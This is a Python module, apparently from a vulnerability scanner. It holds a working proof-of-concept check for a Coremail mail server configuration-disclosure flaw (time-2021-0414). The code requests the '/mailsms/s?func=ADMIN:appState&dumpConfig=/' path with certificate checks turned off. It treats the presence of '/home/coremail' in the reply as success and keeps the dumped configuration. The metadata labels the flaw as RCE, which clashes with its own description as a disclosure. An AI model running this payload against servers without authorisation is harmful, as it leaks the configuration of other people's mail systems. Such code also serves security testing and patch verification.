#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
from thirdparty import requests
from module import globals
from core.verify import verify
from module.md5 import random_md5
from core.verify import misinformation
from thirdparty.requests_toolbelt.utils import dump
from thirdparty.requests.compat import urljoin


class CoreMail():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def time_2021_0414_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "CoreMail: time-2021-0414"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Coremail configuration information disclosure vulnerability"
        self.vul_info["vul_numb"] = "time-2021-0414"
        self.vul_info["vul_apps"] = "CoreMail"
        self.vul_info["vul_date"] = "2021-04-19"
        self.vul_info["vul_vers"] = "unknow"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Coremail configuration information disclosure vulnerability"
        self.vul_info["cre_date"] = "2021-04-29"
        self.vul_info["cre_auth"] = "zhzyker"
        url = urljoin(self.url, "/mailsms/s?func=ADMIN:appState&dumpConfig=/")
        try:
            request = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
            if request.status_code == 200:
                if r"FS_IP_NOT_PERMITTED" not in request.text and r"/home/coremail" in request.text:
                    self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
                    self.vul_info["prt_info"] = "[url:" + url + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

